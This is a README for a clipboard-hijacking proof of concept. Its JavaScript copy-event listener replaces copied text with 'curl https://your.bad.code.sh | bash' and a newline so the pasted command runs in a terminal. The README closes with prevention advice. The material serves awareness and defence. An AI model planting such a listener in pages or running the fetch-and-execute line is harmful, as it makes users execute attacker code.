# copy-paste-hack-js
During their job, developers often copy and paste code from the Internet from sources like Stackowerflow and other websites.  
I have found an **exploit**, with just some lines of JavaScript code, that can alter the copy-paste feature of any browser and make you paste (and execute) a different kind of code.

A running **demo** based on the content of this repository can be found here:  
[**TRY IT NOW**](https://marco97pa.github.io/copy-paste-hack-js/)

## How it works behind the scenes
Using plain JavaScript we detect every time there is a "copy" event on the text the user needs to copy.
When it happens, we set the clipboard content of the user with a different code, as we wish.
We also add a "/n" to simulate the Enter key and execute the code right away.

```javascript
document.getElementById('copyme').addEventListener(
    'copy', function(e){
        e.clipboardData.setData('text/plain',
        'curl https://your.bad.code.sh | bash\n');
        e.preventDefault();
    }
)
```
## How to prevent it from happening
- Always copy code from trusted sources and websites
- Always check the code and if you can't understand it, don't run it
- Install [this **Chrome Extension**](https://chrome.google.com/webstore/detail/copy-paste-hack-blocker/fkfnmcncicigjajpfdgpkjohbondnkld) to protect you from this hack, the extension will display an alert if the contents of your clipboard are different from what you had sleceted to copy.
- Some modern terminals like Windows Terminal display a warning message whenever you are trying to paste a multiline code (like the one in this exploit) and it will show up the code on the screen before getting executed. Just make sure to not ignore those helpful warnings. 
